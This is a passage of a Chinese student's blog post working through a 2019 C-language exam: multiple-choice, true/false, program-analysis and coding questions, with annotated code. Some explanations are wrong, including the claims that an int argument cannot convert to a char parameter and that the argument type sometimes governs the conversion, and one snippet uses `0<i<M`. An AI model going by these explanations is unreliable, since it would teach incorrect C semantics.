class="line">	&#125;</span><br><span class="line">	<span class="comment">//存放最大的成绩的人</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">max</span>[4];</span></span><br><span class="line">	max[<span class="number">0</span>] = arr[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">int</span> bf = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[<span class="number">0</span>].data == arr[i].data) &#123;</span><br><span class="line">			max[bf] = arr[i];</span><br><span class="line">			bf++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bf; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n成绩最大的人有：%s,分数为%d&quot;</span>, max[i].name, max[i].data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230918194123643-1695265255992.png" alt="image-20230918194123643"></p>
<p>最后一道题sort函数我不知道。哦他让我们自己设计sort函数，不管，先放上来哈。</p>
<p><a href="https://blog.csdn.net/qq_42410605/article/details/99935109">C语言sort函数_李歘歘的博客-CSDN博客</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后一道没写出来，54分</p>
<p>总分就是105分，我超这才105.。。。。。🥲要死掉惹</p>
<h1 id="整个习题的总结"><a href="#整个习题的总结" class="headerlink" title="整个习题的总结"></a>整个习题的总结</h1><p>下面开始每一个题目每一个题目的进行解析和相关知识点总结啊</p>
<h1 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920090248486-1695265255992.png" alt="image-20230920090248486"></p>
<p>编译程序的功能是将”高级语言”翻译为”机器语言”,将C语言语句转换成二进制的机器指令。</p>
<p>C语言程序编译的步骤通常包括：<em>预处理、编译、汇编、链接</em>。</p>
<p>但是首要工作是检查语法错误，所以这道题选c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc编译过程分为4个阶段：预处理、编译、汇编、链接。</span><br><span class="line">预处理：头⽂件包含、宏替换、条件编译、删除注释</span><br><span class="line">编译：主要进⾏词法、语法、语义分析等，检查⽆误后将预处理好的⽂件编译成汇编⽂件。</span><br><span class="line">汇编：将汇编⽂件转换成 ⼆进制⽬标⽂件</span><br><span class="line">链接：将项⽬中的各个⼆进制⽂件+所需的库+启动代码链接成可执⾏⽂件。</span><br><span class="line">程序的逻辑和完整性，编译器在编译阶段可以进行检查，但不是其首要目的。</span><br></pre></td></tr></table></figure>

<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920090818142-1695265255993.png" alt="image-20230920090818142"></p>
<p>这道题选D，这个学过数学的都知道选D吧。看不出来直接立即推算了。</p>
<p>其他的也不多解析了，随便看看吧，A选项要把与和或都交换一下就对了，B选项要把两个括号中间的换成或，C选项是个几把，正负号和加法有毛关系。</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920091038948-1695265255993.png" alt="image-20230920091038948"></p>
<p>这个也是很简单的啦，首先看看fun函数，他就是接收一个整数x，然后返回x即可。但是在main函数中，a变量是一个float类型。这个时候我们就需要复习一下我们学过的隐式数据类型转换了。下面介绍两种经典情况</p>
<p><strong>以实参类型为准的情况</strong><br>在一些情况下，编译器会自动转换实参的类型以匹配形参的类型，这意味着实参的类型将起决定作用。<br>例如：<br>假设函数的形参为int类型，实参为float类型的值。在调用函数时，编译器会自动将float类型的实参转换为int类型。这种情况下，实参的类型起决定作用，即使会损失精度。</p>
<p><strong>以形参类型为准的情况</strong></p>
<p>在其他情况下，编译器将以形参类型为准，要求实参类型与之严格匹配。<br>例如：<br>假设函数的形参为char类型，实参为int类型的值。在调用函数时，编译器将会发出警告或错误，因为int类型无法自动转换为char类型。这种情况下，形参的类型起决定作用，必须确保实参与之严格匹配。</p>
<p>其实总结来说，编译器会先尝试隐式转换，如果不行，就会报错。那么这个float是可以转换成int的，那么就直接转换成int就可以了。</p>
<p><strong>那么看回题目</strong>，这道题我们就以int类型为准，最后输出的时候，又是按照%f输出，那么就是酱紫，直接上程序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a = <span class="number">3.14</span>;</span><br><span class="line">	a = fun(a);</span><br><span class="line">	<span class="comment">//printf(&quot;.2%f\n&quot;,a);//我得出这个.23.000000//原题有误</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, a);<span class="comment">//改正后</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920093254080-1695265255993.png" alt="image-20230920093254080"></p>
<p>多次运行修改程序之后我发现了一件事情，顺序是这样的，A首先变量a是float类型，B传入fun函数之后转换为int类型，只剩下3如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a = <span class="number">3.14</span>;</span><br><span class="line">	<span class="comment">//a = fun(a);</span></span><br><span class="line">	<span class="comment">//printf(&quot;.2%f\n&quot;,a);//我得出这个.23.000000//原题有误</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, fun(a));<span class="comment">//改正后</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920094656690-1695265255993.png" alt="image-20230920094656690"></p>
<p>C然后传出来之后又到a变量中，变成float但是只有3了,D最后按%f输出，就是3.00了。但是如果按照%d输出，只会得到0或者乱码，因为是float类型的。<strong>所以这道题选A</strong></p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920095005452-1695265255993.png" alt="image-20230920095005452"></p>
<p>这里p指针指向的是s数组中第二个元素，也就是1。</p>
<p>那么下面a变量就是<code>1*4*6</code>所以最后答案就是C</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920095118674-1695265255993.png" alt="image-20230920095118674"></p>
<p>这个位运算我们之前没学啊，后面我会单独找时间补上。（没想到当时我写的时候还蒙对了哈）<strong>答案是B</strong></p>
<p>解析:左移运算符“&lt; &lt;”是双目运算符。其功能把“&lt; &lt;”左边的运算数的各二进位全部左移若干位,由“&lt; &lt;”右边的数指定移动的位数,高位丢弃,低位补0。左移1位,相当于该数乘以2。<strong>有一说一，我考试的时候就是这么想的</strong></p>
<p>但是我发现，考研的这些题目在百度上面都搜得到，所以我们还是要把找到的题库刷完。</p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920095422332-1695265255993.png" alt="image-20230920095422332"></p>
<p>三行二列，换成索引的话就是，<code>[2][1]</code></p>
<p>然后注意看啊！！这个scanf，是输入，也就是说留下的东西是地址就可以，不用引用了。</p>
<p>由于这个是二维数组，所以行索引的话，其实也是一个指针，那么然后你引用了指向指针的指针，就是这个了<code>*(a+2)</code>这个东西其实也是一个地址，是第三行的第一个元素的地址，然后+1就是第三行的第二个元素了。</p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920100734098-1695265255993.png" alt="image-20230920100734098"></p>
<p>本身定义数组的时候，数组名就是指向数组的第一个元素的指针。//我考试时候的错误思维。</p>
<p>然而，<code>a</code> 是一个一维数组，它的类型是 <code>int[4]</code>，而 <code>p</code> 的类型是指向包含四个整型元素的数组的指针，即 <code>int(*)[4]</code>。它们的类型不匹配，因此在给 <code>p</code> 赋值时会发生编译错误。</p>
<p><strong>但是这道题选A！</strong></p>
<p>int (*p)[10]; p即为指向数组的指针，又称数组指针。</p>
<p>这里不得不提到我们的小董了，有请小董同学😎</p>
<p><a href="https://dhkkk.gitee.io/2022/07/28/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/">二维数组复习 | 小董的BLOG (gitee.io)</a></p>
<p>我们来解释一下数组指针和指针数组的区别(直接复制的捏)</p>
<ul>
<li><p>指针数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p[3];</span><br></pre></td></tr></table></figure>

<p>在C语言中，[]的优先级高于<code>*</code>因此此式正确理解为：<code>int *(p[3])</code>，说明p为一个数组，且该数组用于存放地址，<strong>此时p是一个数组，但其元素内存储的为某个地址</strong></p>
</li>
<li><p>数组指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)[3];</span><br></pre></td></tr></table></figure>

<p>先表明了p是一个指针变量，再说明了p指向的对象是一个int[3]型的数组，且p本身保存的是指向数组的首地址，<strong>此时p是一个指针</strong></p>
</li>
</ul>
<p>所以正确定义数组指针的方法就是这个捏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> (*p)[<span class="number">2</span>];</span><br><span class="line">	p = a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>,**p);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920103553873-1695265255993.png" alt="image-20230920103553873"></p>
<p>第一行定义了一个结构体，person。</p>
<p>第二行穿件了一个结构体的数组，M是第三个的name值的第一个字母.所以这道题就选D</p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920103702815-1695265255993.png" alt="image-20230920103702815"></p>
<p>这个很简单的，需要画图，我当时考试的时候也是花了图才弄出来的。我们直接解析正确答案吧，要不然耗时太久了。</p>
<p>这道题选A，首先题目说的是不能讲s所指的节点插入到链表末尾仍构成单向链表的语句组。</p>
<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920104434650-1695265255993.png" alt="image-20230920104434650"></p>
<p>这样的话，后面两个就是循环状态了，就不是单向链表了，所以a选项是错的。</p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920104509660-1695265255993.png" alt="image-20230920104509660"></p>
<p>这个不多说了哈，B</p>
<h1 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h1><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920104634120-1695265255993.png" alt="image-20230920104634120"></p>
<p>对的</p>
<p>为0就是表达式不满足了，不满足表达式就不执行。（c语言中，非零整数表示ture）</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920104715362-1695265255993.png" alt="image-20230920104715362"></p>
<p><strong>这道题是错的</strong></p>
<p>在用字符串常量初始化字符数组时，数组的长度应该至少是字符串有效字符的个数加上一个额外的位置用于存储字符串结束的空字符（’\0’）。</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920104854665-1695265255993.png" alt="image-20230920104854665"></p>
<p>错的</p>
<p>实际上传递给函数的是数组的地址，也就是指向数组第一个元素的指针。</p>
<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920105542440-1695265255993.png" alt="image-20230920105542440"></p>
<p><strong>这是对的</strong></p>
<p>复合语句用花括号 <code>&#123; &#125;</code> 括起来，可以包含一系列的语句，形成一个逻辑上的代码块。在这个代码块中定义的变量只在该代码块内部有效。</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920105731270-1695265255993.png" alt="image-20230920105731270"></p>
<p>错的</p>
<p>有时候我们可以利用switch语句的特性做程序，没必要配对。</p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920105804898-1695265255993.png" alt="image-20230920105804898"></p>
<p>错的</p>
<p>情况是不确定的，大多都是已形参为准</p>
<ol>
<li>如果实参的类型比形参的类型更窄（例如传递整数给浮点数形参），实参会被隐式转换为形参的类型。例如，将整数值 3 传递给形参为浮点数的函数 <code>foo(float num)</code>，实际上会将整数 3 隐式转换为浮点数 3.0。</li>
<li>如果实参的类型比形参的类型更宽（例如传递一个 <code>long</code> 类型给 <code>int</code> 形参），实参也会通过隐式转换适应形参的类型。</li>
<li>如果实参和形参的类型完全不匹配，编译器会发出错误。例如，将字符串类型传递给整型形参，或者传递一个指针类型给一个非指针形参。</li>
</ol>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920110110905-1695265255993.png" alt="image-20230920110110905"></p>
<p>对的</p>
<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920110123542-1695265255993.png" alt="image-20230920110123542"></p>
<p>指向无参函数的指针</p>
<p>对于这种复杂类型的变量，建议参考本人的博客，<a href="https://wanheiqiyihu.top/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/">c语言碎碎念 | 十三の博客 (wanheiqiyihu.top)</a></p>
<p>搜一下复杂数据类型，我详细介绍了如何理解。</p>
<p>所以用一下这个方法，设int （）是A,那这个就是（*p）A，这个就是一个指向A的指针了，所以就是指向无参函数的指针。</p>
<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920110857028-1695265255993.png" alt="image-20230920110857028"></p>
<p><strong>错的</strong></p>
<p>数组初始化时被赋值的元素个数并不决定数组所占内存单元的个数。数组的内存大小是由数组的类型和数组的长度决定的。</p>
<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920111037487-1695265255993.png" alt="image-20230920111037487"></p>
<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920111104382-1695265255993.png" alt="image-20230920111104382"></p>
<h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230920111116410-1695265255993.png" alt="image-20230920111116410"></p>
<p>在程序中定义一个结构体类型后，编译器并不会为结构体的各成员分配内存空间，直到你创建该结构体类型的变量时，内存空间才会被分配。</p>
<p><strong>所以这道题是错误的！</strong></p>
<p>出门吃个国服砂锅😋</p>
<h1 id="程序分析题"><a href="#程序分析题" class="headerlink" title="程序分析题"></a>程序分析题</h1><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921090431970.png" alt="image-20230921090431970" style="zoom:150%;">

<p> 这种题一定要细心，有时候不是你想的那样的。</p>
<p>不过这个就很简单了，首先定义了一个结构体person，里面会存储名字和年龄。随后跟着定义了一个存有三个结构的数组。</p>
<p>然后主函数中，每有一个最大的age值就把它存在key变量中，同时把对应的person结构体放到q变量中。最后输出q和key。</p>
<p>所以程序的功能就是输出年龄最大的那个人，并且输出其对应的年龄。</p>
<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921093514511-1695265255993.png" alt="image-20230921093514511"></p>
<h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921093536777.png" alt="image-20230921093536777" style="zoom:150%;">

<p>这个就是我之前说的，有时候并不是你想的那样。</p>
<p>他两个答案都是No!嘿~</p>
<p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921093744846-1695265255993.png" alt="image-20230921093744846"></p>
<p>这就需要我们一句一句解析了，我直接用注释的方式写出来好了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str1[<span class="number">100</span>], str2[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">char</span> *p1,*p2;</span><br><span class="line">	<span class="keyword">int</span> k, j, i, len;</span><br><span class="line">	<span class="comment">//定义了一些基础的变量</span></span><br><span class="line">	p1 = str1;</span><br><span class="line">	p2 = str2;<span class="comment">//将指针指向之前定义的两个字符串</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p1);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p2);<span class="comment">//接收字符串</span></span><br><span class="line">	k = j = i = <span class="number">0</span>;<span class="comment">//初始化变量</span></span><br><span class="line">	len = <span class="built_in">strlen</span>(str2);<span class="comment">//这个是计算第二个字符串的长度</span></span><br><span class="line">	<span class="keyword">while</span> (p2[k] != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; p1[j] != <span class="string">&#x27;\0&#x27;</span>) &#123;<span class="comment">//当两个字符串任何一个执行到\0字符的时候就会停止循环</span></span><br><span class="line">		<span class="comment">//注意这里是p2k！！else后面重置的是k！</span></span><br><span class="line">		<span class="keyword">if</span> (p1[k] == p2[j]) &#123;<span class="comment">//如果两个字符相等就将光标向后移动</span></span><br><span class="line">			k++;</span><br><span class="line">			j++;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;相等,%c,%c\n&quot;</span>, p1[k], p2[j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="comment">//如果两个字符不相等就给i加一，顺便k从i开始循环，j从0开始循环。</span></span><br><span class="line">			i++;</span><br><span class="line">			k = i;</span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;不想等,%c,%c,i=%d\n&quot;</span>, p1[k], p2[j],i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="comment">//也就是说，直到str1的某个字符和str2的第一个字符相等的时候才会执行if中的语句</span></span><br><span class="line">	<span class="keyword">if</span> (j &gt; len)<span class="comment">//如果j大于第二个字符串的长度的时候就会输出yes。</span></span><br><span class="line">		<span class="comment">//但是也许永远都不可能输出yes了</span></span><br><span class="line">		<span class="comment">//因为str是不会记录\0的，而j的值会停留在\0，虽然j的值会因为是索引少一个，但是多了个\0</span></span><br><span class="line">		<span class="comment">//所以匹配成功也只能是j=len</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Yes!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;No!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//再看题目第二个</span></span><br></pre></td></tr></table></figure>

<p>总结：每一个字符都要看清楚哈！！！这个while好阴。</p>
<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921101708082-1695265255993.png" alt="image-20230921101708082"></p>
<p>这个就是大写转小写，小写转大写</p>
<p>值得注意的是<strong>A的ASCII码是65，a的ASCII码是97</strong></p>
<p>大写转小写是加，小写转大写是减。</p>
<h1 id="程序设计题"><a href="#程序设计题" class="headerlink" title="程序设计题"></a>程序设计题</h1><p>这个题要人手搓代码，所以我们要多多练习！</p>
<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921102006609.png" alt="image-20230921102006609" style="zoom:150%;">

<p>这里值得注意的是，由符号常量来确定的意思就是让你define一个预编译。</p>
<p>这个我已经写出来了,中间的注释就是核心思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//24题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//计算数周围，也就是第一行的，最后一行的，中间行的第一个和最后一个加起来即可</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == M - <span class="number">1</span>) &#123;</span><br><span class="line">                sum += <span class="built_in">array</span>[i][j];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="number">0</span>&lt;i&lt;M) &amp;&amp; ((j == <span class="number">0</span>) || (j == N - <span class="number">1</span>))) &#123;</span><br><span class="line">                sum += <span class="built_in">array</span>[i][j];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//首先获取二维数组</span></span><br><span class="line">    <span class="keyword">int</span> hang, lie;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这是一个3行4列的二维数组，请按照提示输入数组的内容&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> arry[M][N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第%d行的第%d列的元素:\n&quot;</span>,i+<span class="number">1</span>,j+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arry[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//展示数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n展示数组\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,arry[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;数组的边界之和为：%d&quot;</span>, fun(arry));</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921102307672-1695265255993.png" alt="image-20230921102307672"></p>
<p>这些题都太简单了，如果是python的话，我用屁股写，可惜是c语言捏，当年写python的难度比这个大多了吧。😅（那为什么最后一道题没有写出来啊喂！）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//25题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">arr</span>[4];</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">int</span> data;</span><br><span class="line">	<span class="keyword">for</span> (<span 